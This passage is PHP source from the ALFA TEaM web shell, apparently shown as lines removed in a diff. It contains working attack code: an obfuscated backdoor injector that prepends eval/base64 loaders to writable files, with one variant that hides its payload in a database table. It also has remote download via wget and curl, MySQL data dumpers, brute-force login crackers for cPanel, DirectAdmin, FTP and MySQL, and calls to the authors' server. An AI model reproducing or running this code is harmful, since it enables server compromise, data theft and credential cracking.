-$code = '<?php if(isset($_GET["alfa"])&&$_GET["alfa"]=="'.$key.'"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."(\'?>\'.base"."64"."_dec"."ode(\$c));");$x("'.$shell.'");exit;}?>';
-if(@is_file($file)&&@is_writable($file)){@file_put_contents($file,$code."\n".@file_get_contents($file));__alert($success."<br>Run With: ".basename($file)."?alfa=".$key.'</font>');}else{__alert($error);}}}
-if($_POST['alfa1']=='db'){
-echo("<center><p><div class='txtfont_header'>| In DataBase |</div></p>".getConfigHtml('all')."<p><form onsubmit=\"g('inbackdoor',null,'db',this.db_host.value,this.db_username.value,this.db_password.value,this.db_name.value,this.file.value,this.method.value,this.shell.value,this.key.value);return false;\">");
-$table = array('td1' =>
-array('color' => 'FFFFFF', 'tdName' => 'db_host : ', 'inputName' => 'db_host', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
-'td2' =>
-array('color' => 'FFFFFF', 'tdName' => 'db_username : ', 'inputName' => 'db_username', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
-'td3' =>
-array('color' => 'FFFFFF', 'tdName' => 'db_password : ', 'inputName' => 'db_password', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50'),
-'td4' =>
-array('color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
-'td5' =>
-array('color' => 'FFFFFF', 'tdName' => 'Backdoor Loader: ', 'inputName' => 'file', 'inputValue' => $cwd, 'inputSize' => '50', 'placeholder' => true),
-'td6' =>
-array('color' => 'FFFFFF', 'tdName' => 'Key: ', 'inputName' => 'key', 'inputValue' => 'alfa', 'inputSize' => '50')
-);
-create_table($table);
-echo("<p>{$select}</p>");
-echo($textarea);
-echo("<p><input type='submit' value=' '></p></form></p></center>");
-if($_POST['alfa2']!=''&&$_POST['alfa3']!=''&&$_POST['alfa5']!=''&&$_POST['alfa6']!=''){
-$dbhost = $_POST['alfa2'];
-$dbuser = $_POST['alfa3'];
-$dbpw = $_POST['alfa4'];
-$dbname = $_POST['alfa5'];
-$file = $_POST['alfa6'];
-$method = $_POST['alfa7'];
-$shell = $_POST['alfa8'];
-$key = str_replace(array('"','\''),'',trim($_POST['alfa9']));
-if($key=='')$key='alfa';
-if($method=='my'){$shell=__ZW5jb2Rlcg($shell);}else{$shell=$GLOBALS['__ALFA_SHELL_CODE'];}
-if($conn = mysqli_connect($dbhost,$dbuser,$dbpw,$dbname)){
-$code = '<?php if(isset($_GET["alfa"])&&$_GET["alfa"]=="'.$key.'"){$conn=mysqli_connect("'.str_replace('"','\"',$dbhost).'","'.str_replace('"','\"',$dbuser).'","'.str_replace('"','\"',$dbpw).'","'.str_replace('"','\"',$dbname).'");$q=mysqli_query($conn,"SELECT `code` FROM alfa_bc LIMIT 0,1");$r=mysqli_fetch_assoc($q);$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."(\'?>\'.base"."64"."_dec"."ode(\$c));");$x($r["code"]);exit;}?>';
-if(@is_file($file)&&@is_writable($file)){
-@mysqli_query($conn,'DROP TABLE `alfa_bc`');
-@mysqli_query($conn,'CREATE TABLE `alfa_bc` (code LONGTEXT)');
-@mysqli_query($conn,'INSERT INTO `alfa_bc` VALUES("'.$shell.'")');
-@file_put_contents($file,$code."\n".@file_get_contents($file));
-__alert($success."<br>Run With: ".basename($file)."?alfa=".$key.'</font>');}else{__alert($error);}}}}
-echo('</div>');
-alfafooter();
-}
-function alfawhois(){
-echo("<div class='header'><center><p><div class='txtfont_header'>| Whois |</div></p><p><form onsubmit=\"g('whois',null,this.url.value,'>>');return false;\"><div class='txtfont'>Url: </div> <input type='text' name='url' style='text-align:center;' size='50' placeholder='google.com'> <input type='submit' value=' '></form></p></center>");
-if($_POST['alfa2']=='>>'&&!empty($_POST['alfa1'])){
-$site = str_replace(array('http://','https://','www.','ftp://'),'',$_POST['alfa1']);
-$target = 'http://api.whoapi.com/?apikey=093b6cb9e6ea724e101928647df3e009&r=whois&domain='.$site;
-$data = @file_get_contents($target);
-if($data==''){$get = new AlfaCURL();$get->ssl = true;$data = $get->Send($target);}
-$target = @json_decode($data,true);
-echo __pre();
-if(is_array($target)){echo($target["whois_raw"]);}else{echo alfaEx("whois ".$site);}}
-echo("</div>");
-}
-function alfaremotedl(){
-alfahead();
-echo("<div class='header'><center><p><div class='txtfont_header'>| Upload From Url |</div></p><p>
-<form onsubmit=\"g('remotedl',null,this.d.value,this.p.value,'>>');return false;\">
-<p><div class='txtfont'>Url: </div>&nbsp;&nbsp;&nbsp;<input type='text' name='d' size='50'></p>
-<div class='txtfont'>Path:</div> <input type='text' name='p' size='50' value='".$GLOBALS['cwd']."'><p><input type='submit' value=' '></p>
-</form></p></center>");
-if(isset($_POST['alfa1'],$_POST['alfa2'],$_POST['alfa3'])&&!empty($_POST['alfa1'])&&$_POST['alfa3']=='>>'){
-echo __pre();
-$url = $_POST['alfa1'];
-$path = $_POST['alfa2'];
-echo('<center>');
-if(__download($url,$path)){
-echo('<font color="green">Success...!</font>');
-}else{
-echo('<font color="red">Error...!</font>');
-}
-echo('</center>');
-}
-echo("</div>");
-alfafooter();
-}
-function __download($url,$path=false){
-if(!preg_match("/[a-z]+:\/\/.+/",$url)) return false;
-$saveas = basename(rawurldecode($url));
-if($path){$saveas=$path.$saveas;}
-if($content = __read_file($url)){
-if(@is_file($saveas))@unlink($saveas);
-if(__write_file($saveas, $content)){return true;}}
-$buff = alfaEx("wget ".$url." -O ".$saveas);
-if(@is_file($saveas)) return true;
-$buff = alfaEx("curl ".$url." -o ".$saveas);
-if(@is_file($saveas)) return true;
-$buff = alfaEx("lwp-download ".$url." ".$saveas);
-if(@is_file($saveas)) return true;
-$buff = alfaEx("lynx -source ".$url." > ".$saveas);
-if(@is_file($saveas)) return true;
-$buff = alfaEx("GET ".$url." > ".$saveas);
-if(@is_file($saveas)) return true;
-$buff = alfaEx("links -source ".$url." > ".$saveas);
-if(@is_file($saveas)) return true;
-$buff = alfaEx("fetch -o ".$saveas." -p ".$url);
-if(@is_file($saveas)) return true;
-return false;
-}
-function clean_string($string){
-  if(function_exists("iconv")){
-	  $s = trim($string);
-	  $s = iconv("UTF-8", "UTF-8//IGNORE", $s);
-  }
-  return $s;
-}
-function __read_file($file, $boom = true){
-$content = false;
-if($fh = @fopen($file, "rb")){
-$content = "";
-while(!feof($fh)){
-$content .= $boom ? clean_string(fread($fh, 8192)) : fread($fh, 8192);
-}
-@fclose($fh);
-}
-if(empty($content)||!$content){
-	$content = alfaEx("cat '".addslashes($file)."'");
-}
-return $content;
-}
-function alfaMarket(){
-echo "<div class='header'>";
-$curl = new AlfaCURL();
-$content = $curl->Send("http://solevisible.com/market.php");
-$data = @json_decode($content, true);
-if(!empty($data)){
-if($data["status"] == "open"){
-	echo $data["content"];
-}else{
-	echo $data["error_msg"];
-}
-}else{
-	echo "<div style='text-align:center;font-size:20px;'>Cant connect to the alfa market....! try later.</div>";
-}
-echo "</div>";
-}
-function alfaSettings(){
-alfahead();
-AlfaNum(6,7,8,9,10);
-echo '<div class=header><center><p><div class="txtfont_header">| Settings |</div></p><h3><a href=javascript:void(0) onclick="g(\'settings\',null,null,null,null,null,null,null,null,\'main\')">| Generall Setting | </a></h3></center>';
-if($_POST["alfa8"] == "main"){
-echo '<p><center><div class="txtfont_header">| Settings |</div></p><form onSubmit="reloadSetting(this);return false;" method=\'post\'>';
-$lg_array = array('0'=>'No','1'=>'Yes');
-$penc_array = array('false'=>'No','true'=>'Yes');
-$protect_html = "";
-$icon_html = "";
-$postEnc_html = "";
-$login_html = "";
-$cgiapi_html = "";
-foreach($lg_array as $key=>$val)$protect_html .= '<option value="'.$key.'" '.($GLOBALS['DB_NAME']['safemode']=='1'?'selected':'').'>'.$val.'</option>';
-foreach($lg_array as $key=>$val)$icon_html .= '<option value="'.$key.'" '.($GLOBALS['DB_NAME']['show_icons']=='1'?'selected':'').'>'.$val.'</option>';
-foreach($penc_array as $key=>$val)$cgiapi_html .= '<option value="'.$key.'" '.(!empty($_POST['alfa9'])&&$_POST['alfa9']==$key?"selected":($GLOBALS["DB_NAME"]["cgi_api"]&&empty($_POST['alfa9'])?'selected':'')).'>'.$val.'</option>';
-foreach($penc_array as $key=>$val)$postEnc_html .= '<option value="'.$key.'" '.(!empty($_POST['alfa7'])&&$_POST['alfa7']==$key?"selected":(__ALFA_POST_ENCRYPTION__&&empty($_POST['alfa7'])?'selected':'')).'>'.$val.'</option>';
-$lg_array = array("gui"=>"GUI","500"=>"500 Internal Server Error","403"=>"403 Forbidden","404"=>"404 NotFound");
-foreach($lg_array as $key=>$val)$login_html .= '<option value="'.$key.'" '.($GLOBALS['DB_NAME']['login_page']==$key?'selected':'').'>'.$val.'</option>';
-echo '';
-echo '<table border="1"><tbody><tr><td><div class="tbltxt" style="color:#FFFFFF">Protect:</div></td><td><select name="protect" style="width:100%;">'.$protect_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Cgi Api:</div></td><td><select name="cgi_api" style="width:100%;">'.$cgiapi_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Post Encryption:</div></td><td><select name="post_encrypt" style="width:100%;">'.$postEnc_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Show Icons:</div></td><td><select name="icon" style="width:100%;">'.$icon_html.'</select></td></tr><tr><tr><td><div class="tbltxt" style="color:#FFFFFF">login Page:</div></td><td><select style="width:100%;" name="lgpage">'.$login_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">UserName:</div></td><td><input type="text" style="width:95%;" name="username" value="'.(empty($_POST['alfa3'])?$GLOBALS['DB_NAME']['user']:$_POST['alfa3']).'" placeholder="solevisible"></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Password:</div></td><td><input type="text" style="width:95%;" name="password" placeholder="*****"></td></tr></tbody></table><input type="hidden" name="e" value="'.$GLOBALS['DB_NAME']['safemode'].'"><input type="hidden" name="s" value="'.$GLOBALS['DB_NAME']['show_icons'].'"><p><input type="submit" name="btn" value=" "></p></form></center>';
-if($_POST['alfa5']=='>>'){
-echo __pre();
-if(!empty($_POST['alfa3'])){
-$protect = $_POST['alfa1'];
-$lgpage = $_POST['alfa2'];
-$username = $_POST['alfa3'];
-$password = md5($_POST['alfa4']);
-$icon = $_POST['alfa6'];
-$post_encrypt = $_POST['alfa7'];
-$cgi_api_val = $_POST['alfa9'];
-@chdir($GLOBALS['home_cwd']);
-$basename = @basename($_SERVER['PHP_SELF']);
-$data = @file_get_contents($basename);
-$user_rand = $GLOBALS["DB_NAME"]["user_rand"];
-$pass_rand = $GLOBALS["DB_NAME"]["pass_rand"];
-$login_page_rand = $GLOBALS["DB_NAME"]["login_page_rand"];
-$safemode_rand = $GLOBALS["DB_NAME"]["safemode_rand"];
-$show_icons_rand = $GLOBALS["DB_NAME"]["show_icons_rand"];
-$post_encryption_rand = $GLOBALS["DB_NAME"]["post_encryption_rand"];
-$cgi_api_rand = $GLOBALS["DB_NAME"]["cgi_api_rand"];
-$find_user = '/\''.$user_rand.'\'(.*?),/i';
-$find_pw = '/\''.$pass_rand.'\'(.*?),/i';
-$find_lg = '/\''.$login_page_rand.'\'(.*?),/i';
-$find_p = '/\''.$safemode_rand.'\'(.*?),/i';
-$icons = '/\''.$show_icons_rand.'\'(.*?),/i';
-$postEnc = '/\''.$post_encryption_rand.'\'(.*?),/i';
-$cgi_api_reg = '/\''.$cgi_api_rand.'\'(.*?),/i';
-if(!empty($username)&&preg_match($find_user,$data,$e)){
-$new = '\''.$user_rand.'\' => \''.$username.'\',';
-$data = str_replace($e[0],$new,$data);
-}
-if(!empty($_POST['alfa4'])&&preg_match($find_pw,$data,$e)){
-$new = '\''.$pass_rand.'\' => \''.$password.'\',';
-$data = str_replace($e[0],$new,$data);
-}
-if(!empty($lgpage)&&preg_match($find_lg,$data,$e)){
-$new = '\''.$login_page_rand.'\' => \''.$lgpage.'\',';
-$data = str_replace($e[0],$new,$data);
-}
-if(!empty($find_p)&&preg_match($find_p,$data,$e)){
-$new = '\''.$safemode_rand.'\' => \''.$protect.'\',';
-$data = str_replace($e[0],$new,$data);
-}
-if(preg_match($icons,$data,$e)){
-$new = '\''.$show_icons_rand.'\' => \''.$icon.'\',';
-$data = str_replace($e[0],$new,$data);
-}
-if(preg_match($postEnc,$data,$e)){
-$new = '\''.$post_encryption_rand.'\' => '.$post_encrypt.',';
-$data = str_replace($e[0],$new,$data);
-}
-if(preg_match($cgi_api_reg,$data,$e)){
-$new = '\''.$cgi_api_rand.'\' => '.$cgi_api_val.',';
-$data = str_replace($e[0],$new,$data);
-}
-if(@file_put_contents($basename,$data)){
-echo '<b>UserName: </b><font color="green"><b>'.$username.'</b></font><br /><b>Password: </b><font color="green"><b>'.$_POST['alfa4'].'</b></font><script>post_encryption_mode = '.$post_encrypt.';</script>';
-}else{
-__alert("<span style='color:red;'>File has no edit access...!</span>");
-}
-}else{
-__alert("<span style='color:red;'>UserName is Empty !</span>");
-}
-}
-}elseif($_POST["alfa8"] == "color"){
-echo('<center><p><div class="txtfont_header">| Custom Color |</div></p><form onSubmit="reloadColors();return false;" method=\'post\'>');
-echo '<table border="1"><tbody>';
-$template = '<tr><td style="text-align:center;"><a href="http://solevisible.com/customcolors/{help}.png" target="_blank"><font color="#00FF00">Help</font></a></td><td style="text-align:center;"><div class="tbltxt">{index}</div></td><td><div class="tbltxt" style="margin-left:5px;">{target}:</div></td><td><input style="width:60px;" multi="{multi}" id="gui_{target}" onChange="colorHandler(this);" target=".{target}" type="color" value="{color}"></td><td><input type="text" style="text-align:center;" multi="{multi}" onkeyup="colorHandlerKey(this);" target=".{target}" id="input_{target}" class="colors_input" placeholder="#ffffff" value="{color}"></td></tr>';
-$x = 1;
-foreach($GLOBALS['__ALFA_COLOR__'] as $key => $value){
-	$multi = "";
-	if(is_array($value)){
-		if(isset($value["multi_selector"])){
-			$multi = __ZW5jb2Rlcg(json_encode($value));
-		}
-	}
-	$value = alfa_getColor($key);
-	$help = strtolower(str_replace(array(":", "+"), array("_", "_plus"), $key));
-	echo str_replace(array("{index}", "{target}", "{color}", "{multi}", "{help}"), array($x++, $key, $value, $multi, $help), $template);
-}
-echo '<tr><td style="text-align:center;">-</td><td style="text-align:center;"><div class="tbltxt">*</div></td><td><div style="margin-left:5px;" class="tbltxt">Use Default Color:</div></td><td></td><td><center><input type="checkbox" id="use_default_color" value="1"></center></td></tr>';
-
-echo '</tbody></table><p><input type="submit" name="btn" value=" "></p></form><p><button style="padding:4px;;margin-right:20px;" onclick="$(\'importFileBtn\').click();" class="button"> Import </button> <button style="padding:4px;margin-left:20px;" onclick="g(\'settings\',null,null,null,null,null,null,null,\'export\',\'color\')" class="button"> Export </button></center></p>';
-if($_POST['alfa7']=='export'){
-	echo __pre();
-	$colors = is_array($GLOBALS["DB_NAME"]["color"])?$GLOBALS["DB_NAME"]["color"]:array();
-	$glob_colors = $GLOBALS["__ALFA_COLOR__"];
-	$array = array();
-	foreach($glob_colors as $k => $v){
-		if(isset($colors[$k])&&!empty($colors[$k])&&!$is_default){
-			$v = trim($colors[$k]);
-		}else{
-			$v = trim(is_array($v)?$v["key_color"]:$v);
-		}
-		$array[$k] = $v;
-	}
-	$file = "alfa_color_config_".date('Y-m-d-h_i_s').".conf";
-	$config = json_encode($array, JSON_PRETTY_PRINT);
-	if(!@file_put_contents($file, $config)){
-		echo('<p><center>Color Config:<br><br><textarea rows="12" cols="70" type="text">'.$config.'</textarea></center></p>');
-	}else{
-		echo('<h3><p><center><a class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''.$file.'\', \'download\')"><font color="#0F0">Download Config</font></a></center></p></h3>');
-	}
-}
-if($_POST['alfa2']=='>>'){
-	echo __pre();
-	$colors = json_decode($_POST["alfa1"],true);
-	$array = "";
-	$is_default = isset($_POST["alfa3"])&&$_POST["alfa3"]=="1"?true:false;
-	$glob_colors = $GLOBALS["__ALFA_COLOR__"];
-	foreach($glob_colors as $k => $v){
-		if(isset($colors[$k])&&!empty($colors[$k])&&!$is_default){
-			$v = trim($colors[$k]);
-		}else{
-			$v = trim(is_array($v)?$v["key_color"]:$v);
-		}
-		$array .= '"'.trim($k).'" => "'.$v.'",';
-	}
-	@chdir($GLOBALS['home_cwd']);
-	$basename = @basename($_SERVER['PHP_SELF']);
-	$data = @file_get_contents($basename);
-	$color = '/\'color\'(.*?)\),/s';
-	if(preg_match($color,$data,$e)){
-		$new = "'color' => array(".$array."),";
-		$data = str_replace($e[0],$new,$data);
-		if(@file_put_contents($basename, $data)){
-			echo("<center><p><h3>[+] Success...</h3></p></center><script>location.reload();</script>");
-		}else{
-			echo("<center><p><h3>[-] We Not have permission to Edit shell...!</h3></p></center>");
-		}
-	}else{
-		echo("<center><p><h3>[-] Error...!</h3></p></center>");
-	}
-}
-}
-echo('</div>');
-alfafooter();
-}
-function alfaaboutus(){
-alfahead();
-echo '<div class="header">';
-$news = new AlfaCURL();
-$about_us = $news->Send("http://solevisible.com/aboutus.php");
-if(empty($about_us)){
-$about_us = "<pre><center><img src='http://solevisible.com/images/farvahar-iran.png'><br>
-<b><font size='+3' color='#00A220'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
-<font color='#00A220'>Shell Coded By Sole Sad & Invisible (ALFA TEaM)</font><br>
-<font color='#00A220'>Contact : solevisible@gmail.com</font><br>
-<font color='#00A220'>Telegram Channel: @solevisible</font><br>
-<font color='#FFFFFF'>Skype : ehsan.invisible</font><br>
-<font color='#FFFFFF'>Skype : sole.sad</font><br>
-<font color='#FF0000'>Persian Gulf For Ever</font><br>
-<font color='#FF0000'>Iranian Programmers</font><br>
-<font color='#FF0000'>############</font><br>
-</center></pre><iframe src='tg://resolve?domain=solevisible' frameborder='0' width='0' height='0'></iframe>";
-}
-echo __pre().$about_us;
-echo('</div>');
-alfafooter();
-}
-function alfacoldumper(){
-alfahead();
-echo('<div class="header">');
-AlfaNum(8,9,10);
-echo "<center><br><div class='txtfont_header'>| Mysql Column Dumper |</div><br><br>".getConfigHtml('all')."<form method='post' onsubmit=\"var opt_id=this.getAttribute('opt_id');var delimiter='json';try{if($('dumper-delimiter-type').value == 'delimiter')delimiter=$('dumper-delimiter-input').value}catch(e){};g('coldumper',null,delimiter,JSON.stringify(col_dumper_selected_data[opt_id]),this.db_username.value,this.db_password.value,this.db_name.value,this.dfile.value,this.db_host.value); col_dumper_selected_data[opt_id] = {};return false;\"><p>";
-$delimiter = (!empty($_POST['alfa1']) ? $_POST['alfa1'] : '::');
-$selected_data = json_decode($_POST['alfa2'], true);
-$username = ($_POST['alfa3']);
-$password = ($_POST['alfa4']);
-$dbname = ($_POST['alfa5']);
-$dfile = ($_POST['alfa6']);
-$host = ($_POST['alfa7']);
-$table = array('td1' =>
- array('color' => 'FFFFFF', 'tdName' => 'db_host : ', 'inputName' => 'db_host', 'id' => 'db_host', 'inputValue' => $host, 'inputSize' => '50'),
- 'td2' =>
- array('color' => 'FFFFFF', 'tdName' => 'db_username : ', 'inputName' => 'db_username', 'id' => 'db_user', 'inputValue' => $username, 'inputSize' => '50'),
- 'td3' =>
- array('color' => 'FFFFFF', 'tdName' => 'db_password : ', 'inputName' => 'db_password', 'id' => 'db_pw', 'inputValue' => $password, 'inputSize' => '50'),
- 'td4' =>
- array('color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => $dbname, 'inputSize' => '50'),
- 'td5' =>
- array('color' => 'FFFFFF', 'tdName' => 'Output Path: ', 'inputName' => 'dfile', 'inputValue' => htmlspecialchars($GLOBALS['cwd']), 'inputSize' => '50')
-);
-create_table($table);
-echo "<br><input type='submit' value=' ' name='Submit'></p></form></center>";
-$db = false;
-if(!empty($dbname)){
-	$db = @mysqli_connect($host, $username, $password, $dbname);
-}
-if(count($selected_data) > 0){
-	if($db){
-		if(!is_dir($dfile)){
-			$dfile = $GLOBALS['cwd'];
-		}
-		$tbls = "";
-		$ext = '.txt';
-		if($delimiter == 'json'){
-			$ext = '.json';
-		}
-		foreach ($selected_data as $tbl => $cols) {
-			$tables_query = mysqli_query($db, "SELECT ".implode(',', $cols)." FROM $tbl");
-			$file_name = $dfile.'/'.$dbname.'.'.$tbl.$ext;
-			$fp = fopen($file_name, "w");
-			$data = array();
-			while($row = mysqli_fetch_array($tables_query, MYSQLI_ASSOC)){
-				if($delimiter == "json"){
-					$col_arr = array();
-					foreach ($row as $key => $value) {
-						if(empty($value)){
-							$value = "[empty]";
-						}
-						 $col_arr[$key] = $value;
-					}
-					$data[$tbl][] = $col_arr;
-				}else{
-					$data = "";
-					foreach ($row as $key => $value) {
-						if(empty($value)){
-							$value = "[empty]";
-						}
-						$data .= $value . $delimiter;
-					}
-					fwrite($fp, $data ."\n");
-				}
-			}
-			if($delimiter == "json"){
-				fwrite($fp, json_encode($data));
-			}
-			fclose($fp);
-			$tbls .= "Done ~~~> ".$file_name."<br>";
-		}
-		echo __pre();
-		echo "<center><font color='#00FF00'>".$tbls."</font></center>";
-	}
-}
-if(!empty($dbname) && count($selected_data) == 0){
-//echo __pre();
-if($db){
-	echo("<hr><div style='text-align:center;margin-bottom:5px;font-weight:bolder;'><span>[ Select your tables and columns for dumping data ]</span></div>");
-	echo("<div style='text-align:center;'><span>Output Type: </span><select id='dumper-delimiter-type' onchange='colDumplerSelectType(this);' name='output_type'><option value='delimiter' selected>delimiter</option><option value='json'>json</option></select><div id='coldumper-delimiter-input' style='display:inline;'><span> Delimiter: </span><input id='dumper-delimiter-input' style='text-align:center;' type='text' name='delimiter' placeholder='eg: ,'></div></div>");
-	$data = array();
-	$tables_query = mysqli_query($db, "SELECT table_name FROM information_schema.tables WHERE table_schema = database();");
-	while($row = mysqli_fetch_array($tables_query, MYSQLI_ASSOC)){
-		$data[$row["table_name"]] = array();
-		$table_count_q = mysqli_query($db, "SELECT count(*) FROM `".$row['table_name']."`");
-		$table_count = mysqli_fetch_row($table_count_q);
-		$data[$row["table_name"]]["data_count"] = $table_count[0];
-		$columns_query = mysqli_query($db, "SELECT column_name FROM information_schema.columns WHERE table_name = '".$row['table_name']."'");
-		while($row2 = mysqli_fetch_array($columns_query, MYSQLI_ASSOC)){
-			$data[$row["table_name"]]["cols"][] = $row2["column_name"];
-		}
-	}
-	mysqli_close($db);
-
-	echo '<ul id="myUL">';
-	foreach($data as $tbl => $cols){
-	    echo '<li><span style="color:#00FF00;" class="box">'.$tbl.' ('.$cols["data_count"].')</span><ul class="nested">';
-	    foreach($cols["cols"] as $col){
-	        echo '<li tbl="'.$tbl.'"><span style="color:#00FF00;" tbl="'.$tbl.'" class="box sub-box">' . $col . '</span></li>';
-	    }
-	    echo '</ul></li>';
-	}
-	echo '</ul>';
-}else{
-echo('<center>mysqli_connect : Error!</center>');
-}
-}
-echo('</div>');
-alfafooter();
-}
-function alfaDumper(){
-alfahead();
-echo('<div class="header">');
-AlfaNum(8,9,10);
-echo "<center><br><div class='txtfont_header'>| Mysql Database Dumper |</div><br><br>".getConfigHtml('all')."<form method='post' onsubmit=\"g('dumper',null,null,null,this.db_username.value,this.db_password.value,this.db_name.value,this.dfile.value,this.db_host.value); return false;\"><p>";
-$table = array('td1' =>
- array('color' => 'FFFFFF', 'tdName' => 'db_host : ', 'inputName' => 'db_host', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
- 'td2' =>
- array('color' => 'FFFFFF', 'tdName' => 'db_username : ', 'inputName' => 'db_username', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
- 'td3' =>
- array('color' => 'FFFFFF', 'tdName' => 'db_password : ', 'inputName' => 'db_password', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50'),
- 'td4' =>
- array('color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
- 'td5' =>
- array('color' => 'FFFFFF', 'tdName' => 'Dump Path: ', 'inputName' => 'dfile', 'inputValue' => htmlspecialchars($GLOBALS['cwd']).'alfa.sql', 'inputSize' => '50')
-);
-create_table($table);
-echo "<br><input type='submit' value=' ' name='Submit'></p></form></center>";
-$username = ($_POST['alfa3']);
-$password = ($_POST['alfa4']);
-$dbname = ($_POST['alfa5']);
-$dfile = ($_POST['alfa6']);
-$host = ($_POST['alfa7']);
-if(!empty($dbname)){
-echo __pre();
-$msg = "<center>Check this :  <font color='red'>".$dfile."</font></center>";
-if(@mysqli_connect($host,$username,$password,$dbname)){
-if(strlen(alfaEx("mysqldump"))>0){
-alfaEx("mysqldump --single-transaction --host=\"$host\" --user=\"$username\" --password=\"$password\" $dbname > '".addslashes($dfile)."'");
-echo($msg);
-}else{
-__alert("Error...!");
-}
-}else{
-echo('<center>mysqli_connect : Error!</center>');
-}
-}
-echo('</div>');
-alfafooter();
-}
-function Alfa_DirectAdmin_Cracker($info){
-if(!$info['mysql'])
-$url = $info['protocol'].$info['target'].':'.$info['port'].'/CMD_LOGIN';
-else $url = $info['protocol'].$info['target'].'/phpmyadmin';
-$curl = curl_init();
-curl_setopt($curl, CURLOPT_FOLLOWLOCATION,1);
-curl_setopt($curl, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0');
-curl_setopt($curl, CURLOPT_SSL_VERIFYPEER,0);
-curl_setopt($curl, CURLOPT_SSL_VERIFYHOST,0);
-curl_setopt($curl, CURLOPT_HEADER,0);
-curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($curl, CURLOPT_URL,$url);
-curl_setopt($curl, CURLOPT_USERPWD, $info['username'].':'.$info['password']);
-if($info['mysql'])curl_setopt($curl, CURLOPT_HTTPAUTH, CURLAUTH_ANY);
-$result = @curl_exec($curl);
-$curl_errno = curl_errno($curl);
-$curl_error = curl_error($curl);
-if ($curl_errno > 0) {echo "<font color='red'>Error: $curl_error</font><br>";}
-elseif(preg_match('/CMD_FILE_MANAGER|frameset/i',$result)){
-echo 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';
-$info['target'] = $url;
-CrackerResualt($info);
-}
-curl_close($curl);
-}
-function Alfa_CP_Cracker($info){
-$url = $info['protocol'].$info['target'].':'.$info['port'];
-$curl = curl_init();
-curl_setopt($curl, CURLOPT_FOLLOWLOCATION,1);
-curl_setopt($curl, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0');
-curl_setopt($curl, CURLOPT_SSL_VERIFYPEER,0);
-curl_setopt($curl, CURLOPT_SSL_VERIFYHOST,0);
-curl_setopt($curl, CURLOPT_HEADER,0);
-curl_setopt($curl, CURLOPT_RETURNTRANSFER,1);
-curl_setopt($curl, CURLOPT_HTTPHEADER, array("Authorization: Basic " . __ZW5jb2Rlcg($info['username'].":".$info['password']) . "\n\r"));
-curl_setopt($curl, CURLOPT_URL, $url);
-$result = @curl_exec($curl);
-$curl_errno = curl_errno($curl);
-$curl_error = curl_error($curl);
-if ($curl_errno > 0) {echo "<font color='red'>Error: $curl_error</font><br>";}
-elseif(preg_match('/filemanager/i',$result)){
-echo 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';
-$info['target'] = $url;
-CrackerResualt($info);
-}
-curl_close($curl);
-}
-function Alfa_FTP_Cracker($info){
-$url = $info['protocol'].$info['target'];
-$curl = curl_init();
-curl_setopt($curl, CURLOPT_URL, $url);
-curl_setopt($curl, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0');
-curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($curl, CURLOPT_USERPWD, "".$info['username'].":".$info['password']."");
-$result = @curl_exec($curl);
-$curl_errno = curl_errno($curl);
-$curl_error = curl_error($curl);
-if ($curl_errno > 0) {echo "<font color='red'>Error: $curl_error</font><br>";}
-elseif(preg_match('/(\d+):(\d+)/i',$result)){
-echo 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';
-$info['target'] = $url;
-CrackerResualt($info);
-}
-curl_close($curl);
-}
-function Alfa_Mysql_Cracker($info){
-if(@mysqli_connect($info['target'].':'.$info['port'],$info['username'],$info['password'])){
-CrackerResualt($info);
-echo 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';
-}
-}
-function Alfa_FTPC($info){
-if($con=@ftp_connect($info['target'],$info['port'])){
-if($con){
-$login=@ftp_login($con,$info['username'],$info['password']);
-if($login){CrackerResualt($info);}}}
-@ftp_close($con);
-}
-function CrackerResualt($info){
-$res = $info['target'].' => '.$info['username'].":".$info['password']."\n" ;
-$c = @fopen($info['fcrack'],'a+');
-@fwrite($c, $res);
-@fclose($c);
-}
-function Alfa_Call_Function_Cracker($method,$info){
-switch($method){case 'cp':return Alfa_CP_Cracker($info);break;case 'direct': case 'phpmyadmin':return Alfa_DirectAdmin_Cracker($info);break;case 'ftp':return Alfa_FTP_Cracker($info);break;case 'mysql':return Alfa_Mysql_Cracker($info);break;case 'mysql':return Alfa_FTPC($info);break;}
-}
-function alfaCrackers(){
-alfahead();
-AlfaNum(9,10);
